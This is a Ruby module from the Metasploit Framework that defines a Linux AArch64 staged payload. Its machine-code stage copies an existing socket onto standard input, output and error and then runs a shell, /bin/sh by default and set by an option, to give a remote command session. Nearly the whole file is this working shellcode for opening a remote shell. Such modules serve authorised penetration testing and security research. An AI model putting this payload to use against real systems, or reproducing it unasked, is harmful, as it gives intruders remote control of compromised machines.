##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux dup2 Command Shell',
      'Description'   => 'dup2 socket in x12, then execve',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_AARCH64,
      'Session'       => Msf::Sessions::CommandShell,
      'Stage'         =>
        {
          'Payload' =>
          [
            # Generated from external/source/shellcode/linux/aarch64/stage_shell.s
            0xaa0c03e0,          #  mov	x0, x12
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xd2800001,          #  mov	x1, #0x0                   	// #0
            0xd2800308,          #  mov	x8, #0x18                  	// #24
            0xd4000001,          #  svc	#0x0
            0xd2800021,          #  mov	x1, #0x1                   	// #1
            0xd2800308,          #  mov	x8, #0x18                  	// #24
            0xd4000001,          #  svc	#0x0
            0xd2800041,          #  mov	x1, #0x2                   	// #2
            0xd2800308,          #  mov	x8, #0x18                  	// #24
            0xd4000001,          #  svc	#0x0
            0x10000140,          #  adr	x0, 54 <shell>
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xf90003e0,          #  str	x0, [sp]
            0xf90007e2,          #  str	x2, [sp,#8]
            0x910003e1,          #  mov	x1, sp
            0xd2801ba8,          #  mov	x8, #0xdd                  	// #221
            0xd4000001,          #  svc	#0x0
            0xd2800000,          #  mov	x0, #0x0                   	// #0
            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
            0xd4000001,          #  svc	#0x0
            0x00000000,          #  .word	0x00000000                // shell
            0x00000000,          #  .word	0x00000000
            0x00000000,          #  .word	0x00000000
            0x00000000,          #  .word	0x00000000
          ].pack("V*")
        }
      ))
    register_options([
      OptString.new('SHELL', [ true, "The shell to execute.", "/bin/sh" ]),
    ])
  end

  def generate_stage(opts = {})
    p = super
    sh = datastore['SHELL']
    if sh.length >= 16
      raise ArgumentError, "The specified shell must be less than 16 bytes."
    end
    p[84, sh.length] = sh
    p
  end

end
